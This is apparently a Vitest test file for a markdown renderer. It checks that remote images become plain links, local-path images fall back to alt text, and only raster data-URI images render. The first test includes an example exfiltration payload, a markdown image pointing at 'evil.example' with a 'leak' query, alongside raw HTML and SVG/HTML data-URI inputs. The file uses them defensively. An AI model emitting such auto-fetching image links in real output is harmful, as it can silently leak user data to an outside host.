// @vitest-environment jsdom
import { expect, test } from "vitest";
import { renderMarkdown } from "../src/renderer/shared/Markdown.js";

const PNG = "data:image/png;base64,iVBORw0KGgo=";

test("remote images render as a plain link, never an <img> that auto-fetches", () => {
  const html = renderMarkdown("![secret](https://evil.example/p.gif?q=leak)");
  expect(html).not.toContain("<img");
  expect(html).toContain('<a href="https://evil.example/p.gif?q=leak">secret</a>');
  // Raw HTML images get the same treatment.
  expect(renderMarkdown('<img src="http://evil.example/x.png">')).not.toContain("<img");
});

test("local-path images drop to alt text", () => {
  const html = renderMarkdown("![shot](/Users/me/a.png)");
  expect(html).not.toContain("<img");
  expect(html).not.toContain("<a");
  expect(html).toContain("shot");
});

test("inline raster data: images still render; other data: MIME types are dropped", () => {
  expect(renderMarkdown(`![ok](${PNG})`)).toContain(`<img src="${PNG}"`);
  expect(renderMarkdown("![x](data:image/svg+xml;base64,PHN2Zy8+)")).not.toContain("<img");
  expect(renderMarkdown("![x](data:text/html;base64,PGI+)")).not.toContain("<img");
});
